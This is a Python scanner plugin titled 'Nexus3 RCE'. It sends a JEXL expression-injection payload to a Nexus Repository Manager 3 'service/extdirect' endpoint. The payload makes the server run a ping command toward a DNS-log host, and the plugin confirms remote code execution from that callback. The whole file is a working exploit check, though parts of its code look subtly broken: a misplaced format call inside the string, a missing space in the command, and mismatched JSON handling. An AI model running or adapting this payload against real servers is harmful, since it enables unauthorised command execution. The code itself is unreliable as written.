#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import asyncio
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    Nexus3 RCE
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.base_url, ['./nexus3/', './']):
                    if path[-1] == '/':
                        url = path + 'service/extdirect'
                        headers = {"Content-Type": "application/json"}
                        dns = self.get_dnslog()
                        cmd = 'ping -nc 1' + dns
                        data = '{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":25,"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"1.class.forName(\'java.lang.Runtime\').getRuntime().exec('+ cmd +').waitFor()".format(self.BANNER, self.DOMAIN)},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":4}'
                        async with session.post(url=url, json = data, headers=headers) as res:
                            await asyncio.sleep(1)
                            if await self.get_dnslog_recode(dns):
                                yield url


